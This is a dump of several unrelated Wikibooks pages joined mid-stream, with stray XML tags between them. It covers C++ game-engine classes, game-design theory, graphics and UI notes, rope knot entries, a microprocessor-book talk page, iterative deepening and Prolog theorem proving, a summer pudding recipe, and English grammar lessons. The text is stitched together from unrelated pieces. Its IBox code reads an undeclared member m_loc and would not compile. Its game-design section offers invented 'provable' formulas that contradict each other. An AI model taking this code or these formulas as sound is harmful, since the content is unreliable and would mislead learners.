# Some machines run faster, and animation could be smoother than the time interval with a higher framerate.
Therefore, it is a good idea to create a base class as an interface that separates these functions. This way, every drawable object can be treated the same way, all loading can be done at the same time (for load screens), and all drawing can be done independently of the time interval. OpenGL also requires object display lists to have a unique integer identifier, so we'll also need support for assigning that value.

&lt;pre&gt;
class IDrawable
{
public:
    virtual void load( void ) {};
    virtual void draw( void ) {};
    virtual void step( void ) {};

    int listID()            {return m_list_id;}
    void setListID(int id)  {m_list_id = id;}
protected:
    int m_list_id;
};
&lt;/pre&gt;

== Bounding Boxes ==

One common method of collision detecting is by using axis-aligned bounding boxes. To implement this, we will build upon our previous interface, IDrawable. It should remain separate from IDrawable, because after all, not every object drawn on the screen will require collision detecting. A 3D box should be defined by six values: x, y, z, width, height, and depth. The box should also return the object's current minimum and maximum values in space. Here is an example 3D bounding box class:

&lt;pre&gt;
class IBox : public IDrawable {
    public:
        IBox();
        IBox(CVector loc, CVector size);
        ~IBox();
        float X()	{return m_loc.X();}
        float XMin()	{return m_loc.X() - m_width / 2.;}
        float XMax()	{return m_loc.X() + m_width / 2.;}
        float Y()	{return m_loc.Y();}
        float YMin()	{return m_loc.Y() - m_height / 2.;}
        float YMax()	{return m_loc.Y() + m_height / 2.;}
        float Z()	{return m_loc.Z();}
        float ZMin()	{return m_loc.Z() - m_depth / 2.;}
        float ZMax()	{return m_loc.Z() + m_depth / 2.;}
    protected:
        float m_x, m_y, m_z;
        float m_width, m_height, m_depth;
};

IBox::IBox() {
	m_x = m_y = m_z = 0;
	m_width = m_height = m_depth = 0;
}

IBox::IBox(CVector loc, CVector size) {
	m_x      = loc.X();
	m_y      = loc.Y();
	m_z      = loc.Z();
	m_width  = size.X();
	m_height = size.Y();
	m_depth  = size.Z();
}
&lt;/pre&gt;

== Make your own game engine ==

=== Complexity ===
While it is simple enough in the majority of APIs to display an image, or a textured cube, as you begin to add more complexity to your game, the task naturally becomes slightly harder. With a poorly structured engine this complexity becomes increasingly more so as your engine becomes larger. It can become unclear what changes are needed, and you may end up with huge special case switch blocks where some simple abstraction would have simplified the problem.

=== Extensibility ===
This ties in with the above point - as your game engine evolves you are going to want to add new features. With an unstructured engine these new features are hard to add in, and a lot of time may be spent finding out why the feature is not working as expected. Maybe its some strange function that is interrupting it. A carefully crafted engine separates tasks out so that extending a certain area is just that - and not having to modify prior code.

=== Know your code ===
With a well thought out game engine design, you will begin to know your code. You'll find yourself spending a lot less time staring (or maybe cursing) blindly at a blank screen wondering why on Earth your code is not doing what you ''thought'' you had told it.

=== DRY Code ===
DRY is an acronym frequently used (especially in the extreme programming environment) that means ''do not repeat yourself.'' It sounds simple but can provide you with a lot more time to do other things. Also, code that does a specific task is in one central location so you can modify that small section and see your changes take effect everywhere.

=== In fact, it's common sense ===
The above points probably do not seem that incredible to you - they are really common sense. But without the thought and planning in designing a game engine, you will find reaching these targets a lot harder.

      <text xml:space="preserve">== Game Theory ==
In this chapter we will go over some theories of game design which are not officially recognized but are reasonable and can be proven. If these theories are correct then it will make designing a ''fun'' game all the easier.

There are some primary aspects to a fun game, the challenge, the risk, reward, loss, and innovation.

=== Challenge ===
People play a game for the challenge it poses, this challenge is usually set at the beginning of a game. There are 3 types of challenges.

'''Completion:''' The challenge to complete/finish the game.

'''Compounding:''' The challenge compounds as the player progresses in the plot.

'''Ultimatum:''' The initial challenge is too great for the player to take on so the player must gain ability by playing through the game.

==== Risk ====
Every game presents a risk factor, which is - if the challenge is lost then there is a negative consequence and if the challenge is won then there is a reward. The topics of reward and loss are discussed below. 

Without a risk factor there is no point in playing a game. If there is nothing to lose, there is no challenge. If there is nothing to win, there is no point in playing.

To calculate risk use the following equation: &lt;math&gt;R+L = Risk&lt;/math&gt; The amount that can be lost (or already has been) added to the amount that can or has been won.

==== Reward ====
The reward is the positive consequence of conquering the challenge; it can be anything from an increase in score, new items, or a cut-scene.

'''Tangential reward:''' A reward that has nothing to do with the eventual completion of the game. These rewards can be things such as cut-scenes that are ''cool'' or even unlocking new modes and mini-games. 

'''Compounding reward:''' A reward that builds on itself. This could be defined as score, or even completion of a level. Therefore the value of the compounding reward increases each time it is attained. These rewards can be completion of a level (which compounds into the completion of the game) or even score.

'''Calculating reward''' Reward is calculated by the difficulty of the challenge plus the effort given &lt;math&gt;C + E = Reward&lt;/math&gt;

It is best that the reward is greater than or equal to what had to be done to get the reward. There are some exceptions - for example compounding rewards; though the initial reward was less than the effort the final result is certainly greater.

==== Loss ====
The loss is the negative consequence of failing the challenge; it can be anything from loss score, to a game over.

'''Tangential loss:''' A loss that has nothing to do with the eventual completion of the game. Maybe you lose an item that was fun but had nothing to do with winning the game.

'''Compounding loss:'''A loss that builds on itself. Losing points, or an extra life (which can compound into a game over or ultimatum loss) Therefore the effect of the loss increases each time it is attained. 

'''Ultimatum loss:''' A dangerous but effective element, this is, if the player loses a certain challenge they fail the greatest challenge and they receive the ultimatum. Usually a permanent game over (meaning all progress is lost). This can destroy the replay value very easily.

'''Calculating loss:''' The difficulty of the challenge plus the effort put in. &lt;math&gt;C + E = Loss&lt;/math&gt;

==== Difficulty ====
According to human nature, it is inevitable that a person will learn and gain more skill presented a challenge and a chance to grow - therefore a game must increase in difficulty as the player progresses in order to continue to be challenging.

Difficulty is an important aspect of the structure of a game. There can always be a challenge, but if the challenge presents no level of difficulty then the challenge is useless. 

The difficulty is calculated by how much logic and skill is required of the player to complete a challenge.

''Logic and skill:'' The required input from the player, what is actually challenged. As the game progresses (in most cases) the challenge difficulty increases and therefore the required logic and skill increases.

=== Games Art ===
Game art deals with presentation, specially with non textual information that can be directly part of the game-play or simply used to enrich the player experience.

==== Image ====
{{TODO|Avoid duplication of content about 2D or 3D that is presented later on.}}

==== Sound ====
As with any other feature in a game sound is of major importance, bringing the richest audio experiences possible into a game is increasingly important to make a product stand out in the market. All games are ultimately attempting to do the same, quality and innovation are the corner stones in any new production.

Some audio features that are implement in games consist in:
* Dynamic sound mixing system.
* Interactive music.
* Ambient and environment simulation.
**Realtime convolution reverb (simulation of sound waves reflecting on structures). 

The audio possibilities of a game are linked to the hardware available and system resources we will cover this issue in the [[Video Game Design/Programming/Selecting the Hardware#Audio|Selecting the Hardware for Audio]] section of this book.

=== Ethics in Games ===
{{TODO|Age consideration and positive versus negative emotional content, politics and morals.}}

      <text xml:space="preserve">== Graphics ==
Graphics is the common name for the visual presentation of the game environment and also of each visual representation its components. Creating these visual environments begin generally with the concept artist, that in accordance to the game concept creates visual representation not only of the game characters, objects but also how the environments will look like or even the as the visual expansion of the game creator imagination. That part of work is mostly done outside of the game, with third party software dedicated to those distinct tasks and data.

A games graphics are not restricted to in game art, but also in font design, logos and advertisings for marketing purposes, they also can have a great impact on other types of merchandising like t-shits or toys, or other product spin-offs like animation series or even live action movies based on the game concept. 

=== Vision ===
Vision is the most important sense in humans. Presenting a visually stunning product will trump most other aspects, in attracting players and guarantee initial sales, we already the covered [[Video Game Design/Game content#Presentation|how an attractive presentation is important]].

'''multi-view display'''&lt;br&gt;
Since today it is not uncommon to have a multi-monitor setup, as prices continue to fall and image technology increase multi-monitor support in games will also become common. A multi-monitor setup can also easily expand a normal view to into a mosaic without no special consideration from the game creator, but having distinct screens is extremely interesting for strategy games and simulations as it is not uncommon for the game-play to permit the player to visualize a large number of distinct data.

{{TODO|Extend if possible give examples of games.}}

=== &quot;Special&quot; effects ===
{{TODO|Mine [[w:Parallax]], [[w:Parallax scrolling]] and [[w:Parallax mapping]].}}

=== 2D or 3D ===
Most modern games until recently seemed entrenched in the 3D craze, until the mobile phone brought back the market for a return to simpler visuals and good old 2D creativity and innovation. 2D had been mostly relegated to emulators and reimplementation of old game models.

{{NOTE|Most classic table games, like chess, checkers and card games for instance will not benefit much for complex 3D implementation. This is also true to implementations of classic arcade games that predate the 3D evolution, even if some could be implemented in 3D the game-play itself would be the same or result in a different game altogether.}}

After the initial advances in 3D and the development of good 3D hardware, 3D soon started to be mostly a marketing gimmick, a sell point and a way to hide the frailty of the game concept with good visual, where each new inch gained in performance or visual realism was heralded as a revolutionary must see discovery. Remember what we said about presentation, that is mostly how it is used. Most games do not know how to use it in a way that complements game-play and game design.

{{NOTE|One should also consider the impact that companies developing and commercializing 3D hardware have in game creation. We now even have 3D requirements to the user interface of modern operating systems.}}  

A good 3D game uses dynamic composition of scenes and environments, in most the same way movies do, with the express purpose of showing off the game design and engaging the player's imagination, but with unwavering respect for game-play.  

{{TODO|Cover Allegro, SDL ,OpenGL ,DirectX - The limitation of DirectX is that the technology is only available in Windows OS and the XBox.}}

=== Graphics' engines ===
The game engine should be debugged and tested with more primitive environments and models particularly with game consoles. What the game calls the graphics engine is used to manipulate the games animations scripts characters position in an environment and memory allocation for graphics rendering. Other data such as physics, AI and the game scripts are handled by other engines. There is a large misunderstanding with the general public in that a game is made with only one &quot;engine&quot;.

==== 2D Graphics ====

==== 3D Graphics ====

===== Beyond 3D =====
'''stereoscopic view'''&lt;br&gt;
While most game engine intend only in simulate the simulative of depth and a depth environment alien with other graphics artifacts real 3D only recently started to become popular in games. There are several techniques to produce and display 3D moving pictures. At the core there is the requirement to display offset images that are filtered separately to the left and right eye, hence providing independent focus therefore depth to the scene that is being observed. Two strategies have been used to accomplish this: have the viewer wear eyeglasses to filter the separately offset images to each eye, or have the light source split the images directionally into the viewer's eyes (no glasses required). The issue so far was in the CPU or video card to the generate the required similar but distinct images and the software that would generate those vies, the rise of the GPU and the adoption of 3D TVs has finally permitted general use of this 3D view even if there is not a great number of implementation for games.  

{{TODO|Extend if possible give examples of games.}}

'''beyond polygons'''&lt;br&gt;
In science and medicine the concept of '''point cloud data''' started to get importance due to the high detail it permits with imagining equipment (magnetic, lazer). An Australian company Euclideon has made claims of and advance in 3D scene rendering using points in place of polygon, therefore an increment in the possible level of detail based on Sparse Voxel Octree Graphics. Others are also working on the this type of technique like Atomontage Engine (hybrid approach) or the Voxlap engine by Ken Silverman (that also wrote the Build engine, used in Duke Nukem 3D).

== User Interface ==
The user interface (UI) is a very important component of any game because this is usually the first thing a new player will see when starting up your game. It is also (in most games) always visible to the player, so it is wise to put some effort into making an interface that is intuitive, easy to use and that looks good! There is nothing like a badly designed interface to put someone off a potentially great game.

A user interface consists of:
* Graphics  - Buttons, info panels, maps, etc.)
* Layout - Where those things are placed on the screen
* Interaction - How these things respond to user input; do they bring up a map? your inventory? access settings?

=== 2D and 3D ===
UIs can be rendered in 2D or 3D, the interface itself is in most cases independent from the game-engine, at most it serves as a I/O interface from the player to the game world. Many of the primitives on a UI render will not be present of a game-engine, especially if one is relying on packaged engine.

2D games can have 3D UIs and 3D games can have 2D UIs. The choice is only on design and presentation. Note that computationally 3D UIs will take more resources away from the game and flashy UIs tend to cause only an impact on first contact if there is not deeper integration with the game-play. The UI should also not outshine the game itself, at best it should aim to be useful and informative.

      <comment>/* Design implementation */</comment>
      <text xml:space="preserve">=== Design implementation ===
Before you consider implementing your design one thing that you should ponder as you consider implementation is how costly it will be, in time and money. You can monetize you game design (concept) by selling it to a game creation studio, or you can create an open source project for open implementation.

As you consider what to do, take also in consideration the marketability of the game you created and your objectives. Is it going to be free or are you selling it? If you are selling it, will people want to buy it? How are people going to hear about it? How much money and resources are you willing to spend on marketing this game? Do you have them and are they worth it?

{{NOTE|The design phase will not survive the implementation intact, compromises and adaptations will become part of the process, as the game is implemented the design will need to adapt and evolve. As with any plan, the design will not survive unchanged its first encounter with reality in the field.  }}

The implementation should also be seen as a sandbox where things will be tried out and pruned to meet the required objectives. You should only get worried in the later stages of implementation since at some point one must accept that too much changes will probably ruin the project.

If you stall in some section of your implementation, go back to your design references a see on how others before you handled the issues. You can, and should, be creative but you should expect that the someone has already found at least a workable solution to every issue, use you creative resources to build upon that in place of recreating something equal to what was already done before.

{{TODO|Cover the possibility of using [[Emulation]] to implement the games in newer platforms. Or developing games for older platforms.}}

=== Concept vs. ability ===
Before you begin developing remember to discern between what you want to do, and what you actually can do. Figure out the resources that you have and compare them with the resources the project will require and adjust accordingly. If you have a lot of resources but your concept is simple, perhaps you could expand it. And if you have a complicated concept but simple resources, maybe you need to expand your resources.

After you have gone through all of these considerations outline the project, first by how the game will work and how it is arranged then chronologically by how you are going to accomplish those things - it might be helpful to set a due date for yourself.

==== Resources ====
Consider your resources, what abilities do you personally have? Can you program, draw, and render a polygon? How much money do you have and how much time are you going to spend on it? Do you have the technology to build a game or do you need to get it? Do you know what you need?

[http://en.wikipedia.org/wiki/Programming_languages Programming Languages]

[http://en.wikipedia.org/wiki/Graphic_design Graphic Design]

[http://en.wikipedia.org/wiki/Musical_composition Music composition]

==== Teamwork ====
A video game is a really big project for someone to take on, especially just one person. It may be a good idea to do the project as a team bringing together all the resources you need to put together a good video game. It is almost impossible for only one person to create a game that people will actually enjoy. Being in game development requires you to have good social skills, because 99% of the time you will be working with a team of designers. It Is important that you build a friendly relationship with your fellow game designers to get the best results of a project.

[http://en.wikipedia.org/wiki/Teamwork Teamwork]

== Development phase ==
The testing and development phase are where the game is actually created. As you program, make graphics, compose music and collaborate these resources you will have a lot of testing and debugging to to do. Consider the following sections.

=== Testing ===

| name = Eye splice
| image = eyesplice.jpg
| use = The '''eye splice''' is the best method of creating a permanent loop in the end of multi stranded rope by means of rope splicing.  The ends of the rope are tucked (plaited) back into the standing end to form the loop.  Originally this splice was described with each end being tucked only about three times.  When the splice was made in tarred hemp or cotton this was reasonably safe.  With modern synthetic ropes, five complete tucks is a minimum and additional tucks are recommended for critical loads.  
| tying_instructions =
The ends of the rope are first wrapped in tape or heated with a flame to prevent each end from fraying completely.    The rope is unlayed for a distance equal to three times the diameter for each &quot;tuck&quot;, e.g., for five tucks in half inch rope, undo about 7.5 inches.  Wrap the rope at that point to prevent it unwinding further.  Form the loop and plait the three ends back against the twist of the rope.  Practice is required to keep each end retaining its twist and lie neatly.

| name=Matthew Walker knot
| image= Matthew Walker knot.gif
| image2 = Matthew Walker knot-slack.gif
| use = A '''Matthew Walker knot''' is a decorative knot that is used to keep the end of a rope from fraying. It is tied by unraveling the strands of a twisted rope, knotting the strands together, then laying up the strands together again.  It may also be tied using several separate cords, in which case it keeps the cords together in a bundle.
| tying_instructions = 
A Matthew Walker knot is tied in a circular bundle of any number of strands.  To tie the knot, the tier takes each strand and forms a loop around the rest of the bundle, then passes the end through the newly-formed loop to form an overhand knot.  He then moves to the next strand over, moving around the bundle in the direction he passes the loops.  Tying the first strand around the bundle is straightforward, but each subsequent end must be passed through the previously-formed loops in order to contain all of the other strands in its loop.  When tightening, it may help to roll the knot along the bundle, especially when using only two strands.  The final effect is a spiral knot vaguely resembling a section of a barber's pole.

| name=Common whipping
| use = The '''common whipping''' is the simplest type of whipping knot, a series of knots intended to stop a rope from unraveling. As it can slip off of the rope easily, the common whipping should not be used for rope ends that will be handled. This whipping knot is also called 'wolf' whipping in some parts of the world. 

The benefit of a common whipping is that no tools are necessary and the rope does not need to be unlayed.  The problem is that it will slide off the end of the rope with little provocation.  Other whippings avoid this by interleaving the whipping with the strands of the rope and creating friction with the strands to avoid slipping.

Normally a natural fiber rope is whipped with twine. The size of the rope dictates the size of the twine. Any twine can be used, but tarred two strand hemp (marline) is preferred. Artificial-fiber ropes should have their ends fused by heat rather than whipped to prevent unraveling.  

| tying_instructions =
&lt;gallery&gt;
Image:Common-whipping-binding-0.png|The rope should be whipped a short distance (One and a half times the diameter) from its end.
Image:Common-whipping-binding-1.png|Lay the head of the twine along the rope, make a bight back along the rope
Image:Common-whipping-binding-2.png|Begin wrapping the twine around the rope and bight of twine securely.  Wrap until the whipping is one and a half times wider than the rope is thick.
Image:Common-whipping-binding-3.png|Slip the working end of the twine through the bight.
Carefully pull on the standing end of the twine until the bight and working end are pulled under the whipping (Note: It is normally necessary to maintain tension on the working end to prevent the bight from being dragged completely through and so destroying the whipping)
Image:Common-whipping.png|Cut the twine flush with the edges of the whipping and the rope end not less than half its width from the whipping to give the rope end a finished look
&lt;/gallery&gt;

      <text xml:space="preserve">== Good Start ==

I just stumbled on to this book by accident, and I have to say, I'm pretty impressed (microprocessor architecture is my main concentration along with embedded systems). However, it is kind of lacking in the department of gate level design of a processor, but then again its very very good, you could call this a developed text by now. I wish I had time to commit to wikibooks, maybe by this winter I will, since this I'll be graduateing this December. I'll try to make some modifications here and there, to make it look more like a textbook when I roam around wikibooks every once in a while. [[User:Asm2750|Asm2750]] 05:45, 22 June 2007 (UTC)


== quote ==

I think it would be nifty to start each chapter with a quote from a person who has designed a microprocessor.

* Chuck Peddle ( 6502 )
* Bill Mensch and Kathryn Mensch ( WDC 65816 ). 2 people. (full custom?)
* Carver Mead and Lynn Conway
* Chuck Moore
* Chip Gracey of Parallax, Inc. says some interesting things about [http://forums.parallax.com/forums/default.aspx?f=25&amp;m=170044 the process he used to design a parallel-processing chip]. 8 years, 2 people, full-custom down to the individual polygons.
* John P. Shen
* John L. Hennessy and David A. Patterson
* ... etc.

--[[User:DavidCary|DavidCary]] 21:38, 17 July 2007 (UTC)

:I like this idea a lot. I wonder if we will be able to scavenge the quotes we need from Wikiquote, or if we will have to get them from other sources. --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 20:00, 6 February 2009 (UTC)

== multi-core ==

I'm thinking about merging the 2 chapters &quot;[[Microprocessor Design/Multicore Processors]]&quot; and &quot;[[Microprocessor Design/Multi-Core Systems]]&quot;.
Or is there some subtle, yet crucial, difference that I'm missing?
--[[User:DavidCary|DavidCary]] ([[User talk:DavidCary|talk]]) 04:28, 6 January 2008 (UTC)

:The difference I had envisioned was that one chapter would do with the practice of putting multiple cores on a single die, and the other would deal with the practice of using multiples dies on a single motherboard. With the exception that the busses used to ferry data between the cores in each model are different, the two are very similar in theory. I agree with the merger. --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 00:05, 7 January 2008 (UTC)

== CPU Design HOW-TO ==

I emailed Alavoor Vasudevan, asking
: I am helping to write a book currently titled &quot;Microprocessor Design&quot;.
: Do you mind if I copy-and-paste your HOW-TO into my book (giving credit of course)?
His response was
: Sure you can.

Is there anything else I need to do before I copy-and-paste the entire contents of his

into this Wikibook?

== performance ==

I seem to be repeating myself in my edits to
* [[Microprocessor Design/Performance]] and
* [[Microprocessor Design/Performance Metrics]].

Is there some subtle difference between these that I am missing, or should we merge them?

      <text xml:space="preserve">==Iterative Deepening==

Iterative deepening is a complete search strategy, which combines
depth-first with breadth-first search.
  
*&lt;math&gt;depthbound = 1&lt;/math&gt; 
*do while (not found) &lt;br&gt;Search by limited depth-first search until &lt;math&gt;depthbound&lt;/math&gt;. &lt;br&gt;Set  &lt;math&gt;depthbound = depthbound+ 1&lt;/math&gt; 

Number of expansions in a tree with branching factor &lt;math&gt;b&lt;/math&gt; until depth
&lt;math&gt;d&lt;/math&gt; is 
&lt;center&gt;&lt;math&gt;
1+b + b^2 + \cdots + b^{d-1} + b^d
&lt;/math&gt;&lt;/center&gt;

The total number of expansions in iterative deepening search is 
&lt;center&gt;&lt;math&gt;
(d+1)* 1 + d*b + (d-1) *b^2 + \cdots + 3 * b^{d-2} + 2* b^{d-1} + 1*b^d
&lt;/math&gt;&lt;/center&gt;

Hence time complexity of iterative deepening is still &lt;math&gt;O(b^d)&lt;/math&gt;.



As exemplified by PTTP (&quot;Prolog Technology Theorem Prover&quot;)
Prolog can be viewed as an &quot;almost complete&quot; theorem
prover, which has to be extended by only a few ingredients in order to
handle the non-Horn case.
By this technique the benefits of optimizing
Prolog compilers are accessible to theorem proving.
First we will briefly review the standard approach, and then we will
describe the necessary modifications to obtain restart model
elimination.
The PTTP-approach transforms a given clause set into a Prolog program.
The transformed Prolog program must execute the clauses according to
some complete proof procedure. ''Model elimination'' turns out to
be particularly useful for this, since it is, like Prolog, an input
proof procedure.  In particular, the transformation from the input
clauses to Prolog works as follows:

  
*An input clause such as &lt;br&gt; &lt;center&gt;&lt;math&gt;C \gets A \land B  &lt;/math&gt;&lt;/center&gt; is transformed into a Prolog clause &lt;center&gt; &lt;pre&gt; (1) c :- a, b.&lt;/pre&gt;&lt;/center&gt;  Additionally, since in the model elimination calculus every literal in a clause can equally well serve as an entry point into the clause, all contrapositives are needed. In this case these are  
&lt;center&gt;&lt;pre&gt; (2) not_a :-  not_c, b.
 (3)  not_b :-  a, not_c.&lt;/pre&gt;&lt;/center&gt; This example also shows how negation is treated, namely by making it part of  the predicate name. 
*Prolog's unsound unification has to be replaced by a sound   unification algorithm. This can either be done by directly building-in   sound unification into the Prolog implementation, or by reprogramming   sound unification in Prolog and calling this code instead of   Prolog's unsound unification.  
*A complete search strategy is needed. Usually depth bounded   iterative deepening is used. The strategy can be compiled into the Prolog program by additional parameters, being used as &quot;current   depth&quot; and &quot;limit depth&quot;. The cost of an extension  step can   be uniformly 1 (depth bounded search),    or can be proportional to the length of the input clause (inference    bounded search).  
* The model elimination reduction operation has to be   implemented. This can be realized by memorizing the subgoals solved so   far (the A-literals) as a list in an additional argument, and by   Prolog code that  checks a goal for a  complementary member of that   list. Of course, this check has to be carried out with sound   unification.    The Prolog clause (1) from above then looks like  &lt;pre&gt; (1') c(Anc) :- a([-a|Anc]), b([-b|Anc]).&lt;/pre&gt;   where  Anc is a Prolog list which contains the ancestor literals (called A-literals in  ());  code for reduction steps then looks like  
&lt;pre&gt;(Red-C)  c(Anc) :- member(c,Anc).
(Red-notC)  not_c(Anc) :- member(-c,Anc).&lt;/pre&gt;

{{recipe}} | [[Cookbook:Dessert|Dessert]]

Summer Pudding is a quintessentially British dessert made from wonderful fresh ingredients only available in the summer months. 

It is redolent of a private dinner at a smart country house, maybe somewhere in the Surrey hills near Shere, with the taste of an exquisite first course still lingering, a bottle of chilled champagne still half full, and the prospect of more enticing conversation to come as the evening turns into night. Once you make it once, you'll make it again and again!''

== Ingredients ==

* 1 [[Cookbook:Punnet|punnet]] [[Cookbook:Strawberry|strawberries]]
* 1 punnet [[Cookbook:Raspberry|raspberries]]
* ½ punnet [[Cookbook:Currant|blackcurrants]]
* ½ punnet [[Cookbook:Currant|redcurrants]]
* 1 loaf of white, sliced, pappy sort of [[Cookbook:Bread|bread]] or, for a special treat, a large slab of Brioche
* 2 Tbsp [[Cookbook:Caster sugar|caster sugar]]
* the [[Cookbook:Zest|zest]] of a [[Cookbook:Lime|lime]] chopped finely
* 2 or 3 [[Cookbook:Mint|mint]] leaves again, finely chopped
* a bottle of the best quality blackcurrant cordial you can find, in reserve

== Procedure ==

First you will need to find yourself a pudding bowl about 5 inches in diameter which you will need to butter well on the inside. It should preferably however NOT be greater in diameter that the size of your (assumedly square) pieces of sliced white bread or brioche. 

If you are worried about getting the whole thing out of the bowl in one piece, line the bowl first with some cling film. It's a fiddly job, but ensures you get a perfect shape at the end !!

Take the Blackcurrants and redcurrants, mint leaves and Lime zest and turn them into a saucepan. Add the sugar and about 3 Tbsp Water, and on the lowest possible heat setting of your cooker, poach them for about 5 minutes. Add the strawberries - having cut any large ones in half - and poach for another minute.

Turn the heat OFF and add the raspberries.   Leave to cool

''Now for the fun part !!''

Take your bowl and using it as a cutter, cut a circle out of the white bread the same diameter as the ''top'' of the bowl itself.

Now find a cup or glass that is roughly the same diameter as the ''bottom'' of your bowl and do the same.

Next, using a sharp knife for both cutting and as a measuring implement, slice the white bread (''no crusts allowed''!!) into squares or oblongs, roughly the same ''height'' as the bowl which will be used to line the inside of the bowl. This does not have to be an exact science, but close is good !!

In simple terms what we are trying to do is to line the bowl with the white bread.

Now, lay the small circle of white bread on the bottom of the bowl. Put the oblongs of white bread up the side of the bowl, overlapping slightly, and pour the fruit mixture into the void right up to the top. don't be mean with the juice either. The bread should become well soaked in the juice from the cooked fruit. 

Indeed if there is not enough juice to soak the bread so it turns very red, use the cordial as a top-up.

Now, complete the mould, and place the large circle, or disc, of bread on the top and press it down well.

It's now necessary to press the whole thing down, so that the sauce sort of glues the bread together and so please find a weight or something that fits into the top of the bowl so it squashes everything down tight, and place it in the fridge for at least 40 minutes.

When you are ready to serve the pudding, carefully using a knife, release the bread mould from the side of the bowl, and invert the whole thing onto a plate. 

If things become a little fraught and wobbly at this point...and the photo accompanying this page is a quite brilliant example!.....don't panic, and sort of whack everything back into shape using a wooden spoon.

Decorate your plate with some more summer fruit, maybe a couple of mint leaves and an artistic dollop of fresh whipped cream or crème fraîche and serve with a flourish.

Bon Appetit !

      <comment>/* Capitalization in English */</comment>
      <text xml:space="preserve">English has many rules on capitalization and spelling, and spelling tends to vary between different dialects (especially British English and American English).


== Capitalization in English ==
There are several times when letters must be capitalized in English. They are: &lt;br&gt;
1) At the start of a sentence; &quot;'''''T'''he cat is on the bed.''&quot; &lt;br&gt;
2) The first letter of a proper noun (a month/day/country/language/name etc.) and adjectives, adverbs etc. derived from them; &quot;'''''P'''eter went to '''S'''pain on '''T'''uesday.''&quot; and &quot;'''''J'''ohn ate a '''S'''panish dish.''&quot; &lt;br&gt;
3) In a religious context, when using 'he' to refer to God; &quot;'''''H'''e thought it good.''&quot; &lt;br&gt;
4) First person singular: “'''I'''”. &lt;br&gt;

== Spelling in English ==
British English and American English have different ways of spelling certain words, especially those with '''ou''' in the middle, for example: &lt;br&gt;
1. British English: ''colo'''u'''r'', American English: ''color''. 
2. British English: ''hono'''u'''r'', American English: ''honor''. 

Another variation is the use of 'z' instead of 's' in certain words in American English. 
1. British English: ''capitalisation'', American English: ''capitali'''z'''ation'' 
2. British English: ''modernisation'', American English: ''moderni'''z'''ation''. 
3. British English: ''industrialisation'', American English: ''industriali'''z'''ation''. 
This usually only applies to words that end in -ise and -isation.

      <comment>/* Subjects which are third person and singular must agree with the GENDER of the noun as well. */</comment>
      <text xml:space="preserve">English has 6 personal pronouns.

= Subject Personal Pronouns =
 

'''Subject Pronouns''' are words that '''replace''' ''subject nouns'' or ''subject noun phrases''.

'''I''' - first person singular ('''yo, eu, je, ich, أنا''') &lt;br&gt;
'''You''' - second person singular ('''tú (usted)*, tu (você)*, tu, du, أنت''') &lt;br&gt;
'''He/She/It''' - third person singular ('''el/ella, ele/ela, il/elle, er/sie/es, هى/هو''') &lt;br&gt;
'''We''' - first person plural ('''nosotros, nós, nous, wir, نحن''') &lt;br&gt;
'''You''' - second person plural - rarely used ('''vosotros (ustedes)*, vós (vocês)*, vous, ihr/Sie, انتم\انتن''') &lt;br&gt;
'''They''' - third person plural ('''ellos/ellas, eles/elas, ils/elles, sie, هم\هن''') &lt;br&gt;

== Subject Pronouns '''replace''' subject nouns. ==

Consider these two sentences:

  '''Charles''' picks flowers from the garden.
  '''He''' picks flowers from the garden.

'''Charles''' is a ''noun''. '''Charlie''' is also the ''subject'' of the sentence&lt;br&gt; 
Therefore, '''Charles''' is a ''subject noun''.
Because '''Charles''' is a male personal name, the subject of the sentence is male in gender.

'''He'' is a ''subject pronoun'', describing male nounds. '''He''' '''''replaces''''' '''Charles'''.

== Subject Pronouns '''replace''' subject noun phrases. ==

Consider these two sentences:

 * '''BIRDS FROM CANADA''' fly south in the winter.
 * '''THEY''' fly south in the winter.

'''BIRDS FROM CANADA''' is a ''noun phrase''. '''BIRDS FROM CANADA''' is also the ''subject''.&lt;br&gt; 
Therefore, '''BIRDS FROM CANADA''' is a ''subject noun phrase''.

'''THEY''' is a ''subject pronoun''. '''THEY''' '''''replaces''''' '''BIRDS FROM CANADA'''.

== Subject pronouns '''agree''' with the '''PERSON''' and '''NUMBER''' of subject nouns ==

Pronouns are either FIRST person, SECOND person, or THIRD person.

Pronouns have NUMBER. This means pronouns are either SINGULAR or PLURAL. 

Consider these two sentences:

 * '''JOHN AND I''' went to the movies.
 * '''WE''' saw Spiderman II.

'''JOHN AND I''' is the ''subject''.&lt;br&gt;
'''JOHN AND I''' is '''FIRST PERSON'''.&lt;br&gt; 
'''JOHN AND I''' is also '''PLURAL'''. 

'''WE''' is the '''FIRST PERSON, PLURAL''' ''subject pronoun''. '''WE''' '''''replaces''''' '''JOHN AND I'''.

== Subjects which are '''third person and singular''' must agree with the '''GENDER''' of the noun as well. ==

Third Person, '''SINGULAR''' Pronouns replace ''People'' or ''Things''. &lt;br&gt;
People can be ''men'' or ''women''. Men have a '''MASCULINE GENDER'''. Women have a '''FEMININE GENDER'''.&lt;br&gt;
Things are ''not'' people. In English, things usually have '''NO GENDER''' ''(neuter)''.

'''Note:''' '''ALL''' third person, '''PLURAL''' Pronouns are '''''the same (THEY)'''''.

Consider these sentences:

 * '''CINDY''' ran three miles on the beach.
 * '''SHE''' usually runs five miles.

'''CINDY''' is a woman. A woman has a '''FEMININE GENDER'''.&lt;br&gt;
Therefore, '''CINDY''' is THIRD PERSON, SINGLE, '''''and''''' '''FEMININE'''.

'''SHE''' is the THIRD PERSON, SINGLE, '''FEMININE''' Subject Pronoun. '''SHE''' '''''replaces''''' '''CINDY'''.

Consider these sentences:

 * '''BOB''' watched nine hours of television.
 * '''HE''' didn't run three miles on the beach.

'''BOB''' is a man. A man has a '''MASCULINE GENDER'''.&lt;br&gt;
Therefore, '''BOB''' is THIRD PERSON, SINGLE, '''''and''''' '''MASCULINE'''.

'''HE''' is the THIRD PERSON, SINGLE, '''MASCULINE''' Subject Pronoun. '''HE''' '''''replaces''''' '''BOB'''.

The third person, single pronoun for most ''non-human ('''things''')'' nouns or noun phrases is '''IT'''.

 * '''THE CAR''' is very dirty.
 * '''IT''' needs a car wash.

'''THE CAR''' is a thing. Things have '''NO''' Gender.&lt;br&gt;
Therefore, '''THE CAR''' is THIRD PERSON, SINGLE, '''''but''''' ''NO GENDER''.

'''IT''' is the THIRD PERSON, SINGLE Subject Pronoun for '''things''' with '''NO GENDER'''. '''IT''' '''''replaces''''' '''THE CAR'''.

